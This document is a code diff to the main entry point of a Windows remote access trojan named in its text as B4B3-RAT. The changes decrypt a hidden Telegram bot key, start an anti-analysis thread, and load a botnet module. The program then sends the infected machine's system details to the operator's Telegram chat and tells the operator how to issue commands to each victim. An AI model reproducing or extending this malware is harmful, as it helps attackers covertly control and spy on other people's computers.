@@ -21,7 +21,7 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 */
-
+#pragma warning(disable: 4996)
 #include "common.h"
 #include "Manager.h"
 #include "Telegram.h"
@@ -30,12 +30,10 @@ SOFTWARE.
 #include "ProcessManager.h"
 #include "FileManager.h"
 #include "ServiceManager.h"
-
 #include "ScreenTool.h"
-
 #include "Information.h"
-
 #include "BotNet.h"
+#include "Protector.h"
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	srand((unsigned int)time(NULL));
@@ -98,14 +96,19 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	else {
 		RegCloseKey(hKey);
 
+		strcpy(s.botapi, DecryptStr(s.botapi, s.key).c_str());
+		if (s.botapi == "") {
+			ExitProcess(0);
+		}
+
 		Telegram api(s.botapi);
 		BotNet botnet;
 
 		SYSTEM_INFO SysInfo;
 		GetSystemInfo(&SysInfo);
 
-		if (s.protect_debuggers) {
-			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector, 0, 0, 0);
+		if (s.protector) {
+			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)AntiProcesses, 0, 0, 0);
 		}
 
 		int ID = rand();
@@ -119,7 +122,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 			"%0ANum of processors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
 			"%0APage size: " + std::to_string(SysInfo.dwProcessorType) +
 			"%0AProcessor: " + GetProcessorBrand() +
-			"%0A%0AFor send command to this user, type: /user" + std::to_string(ID) + " command";
+			"%0A%0AFor send command to this user, type: /user" + std::to_string(ID) + " [command]"
+			"%0AP.S: To show commands: click on \"Test BOT API\" in B4B3-RAT Builder.";
 		api.SendTextMessage(s.chatid, information.c_str());
 
 		std::string last;
